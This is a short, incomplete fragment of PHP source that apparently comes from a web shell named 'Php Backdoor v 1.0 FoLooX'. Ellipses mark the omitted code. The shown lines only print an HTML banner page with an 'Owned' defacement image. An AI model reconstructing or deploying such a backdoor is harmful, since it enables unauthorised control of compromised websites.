...
echo '<html>';
echo '<head><title>Php Backdoor v 1.0 FoLooX</title></head>';
...
echo '<h1>Php Backdoor v 1.0 FoLooX</h1><br><br>';
echo '<center><img src="http://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Flag_and_map_of_Algeria.svg/610px-Flag_and_map_of_Algeria.svg.png" alt="Owned FoLooX"></center>';
echo '<br><br>';
...
echo '<br><br>################################<br><br>';
echo 'Php Backdoor v 1.0 FoLooX<br><br>';
echo '################################<br><br>';
